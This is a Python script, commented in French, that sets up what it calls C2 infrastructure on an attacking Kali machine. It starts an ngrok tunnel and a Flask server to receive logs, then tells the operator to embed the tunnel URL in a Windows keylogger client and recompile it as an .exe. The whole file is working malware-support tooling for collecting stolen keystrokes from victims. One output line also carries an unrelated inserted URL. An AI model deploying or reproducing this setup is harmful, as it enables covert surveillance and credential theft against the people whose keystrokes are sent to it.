import subprocess
import time
import os
import sys

FLASK_PORT = 5000
KEYLOGGER_FILENAME = "keylogger_win_remote.py"

def get_ngrok_url():
    """Tente de récupérer l'URL publique de Ngrok via son API locale."""
    try:
        import requests
        # L'API locale de Ngrok est accessible sur le port 4040
        response = requests.get('http://127.0.0.1:4040/api/tunnels')
        response.raise_for_status()
        data = response.json()
        
        # Extrait l'URL HTTPS du premier tunnel
        if data['tunnels']:
            for tunnel in data['tunnels']:
                if tunnel['proto'] == 'https':
                    return tunnel['public_url']
        return None
    except Exception as e:
        return None

def main():
    print("------------------------------------------------------------------")
    print(" 🚀 DÉPLOIEMENT DE L'INFRASTRUCTURE C2 (KALI ATTAQUANTE)")
    print("------------------------------------------------------------------")

    # Vérification des dépendances (Ngrok est vérifié via subprocess)
    if not os.path.exists("log_receiver.py"):
        print("[ERREUR] Le fichier 'log_receiver.py' est introuvable. Assurez-vous d'être dans le bon répertoire.")
        sys.exit(1)

    # --- 1. Lancement de Ngrok en arrière-plan ---
    print(f"\n[INFO] 1. Lancement de Ngrok en arrière-plan (Port {FLASK_PORT})...")
    
    # On lance Ngrok dans un processus séparé pour ne pas bloquer le terminal
    try:
        # On utilise subprocess.Popen pour ne pas bloquer le thread principal
        ngrok_process = subprocess.Popen(['ngrok', 'http', str(FLASK_PORT)], 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE)
    except FileNotFoundError:
        print("[FATAL] La commande 'ngrok' est introuvable. Veuillez l'installer et l'authentifier.")
        sys.exit(1)

    # Attendre quelques secondes pour que Ngrok se connecte et expose l'API
    time.sleep(5)
    
    # --- 2. Récupération de l'URL Ngrok ---
    ngrok_url = get_ngrok_url()

    if not ngrok_url:
        print("[ERREUR] Impossible de récupérer l'URL Ngrok via l'API. Tentative de nettoyage.")
        ngrok_process.terminate()
        sys.exit(1)

    # --- 3. Affichage de l'URL et des Instructions ---
    print("\n------------------------------------------------------------------")
    print(" 🔗 CONFIGURATION DU KEYLOGGER CLIENT")
    print("------------------------------------------------------------------")
    print(f"https://republiquela.com/ Copiez l'URL suivante pour le keylogger Windows :")
    print(f"   {ngrok_url}")
    print("\n[INSTRUCTION] Dans le fichier Python du client, changez la ligne :")
    print(f"   NGROK_URL = \"...\"")
    print(f"   dans le fichier {KEYLOGGER_FILENAME} et recompilez le .exe.")
    print("------------------------------------------------------------------")

    # --- 4. Lancement de Flask au Premier Plan (Interactif) ---
    print("\n[INFO] 2. Lancement du serveur Flask. Les logs s'afficheront ici en direct.")
    print("[INFO] Appuyez sur CTRL+C pour arrêter Flask et Ngrok.")
    
    # On lance Flask au premier plan pour voir les logs défiler
    flask_process = subprocess.Popen(['python3', 'log_receiver.py'])
    
    try:
        # Attendre que Flask se termine (généralement par CTRL+C)
        flask_process.wait()
        
    except KeyboardInterrupt:
        print("\n[ARRET] Signal d'interruption reçu (Ctrl+C).")
        
    finally:
        # --- 5. Nettoyage ---
        print("[ARRET] Arrêt du processus Flask...")
        if flask_process.poll() is None:
            flask_process.terminate()
            
        print("[ARRET] Arrêt du tunnel Ngrok...")
        if ngrok_process.poll() is None:
            ngrok_process.terminate()
            
        print("Infrastructure C2 arrêtée.")

if __name__ == "__main__":
    main()

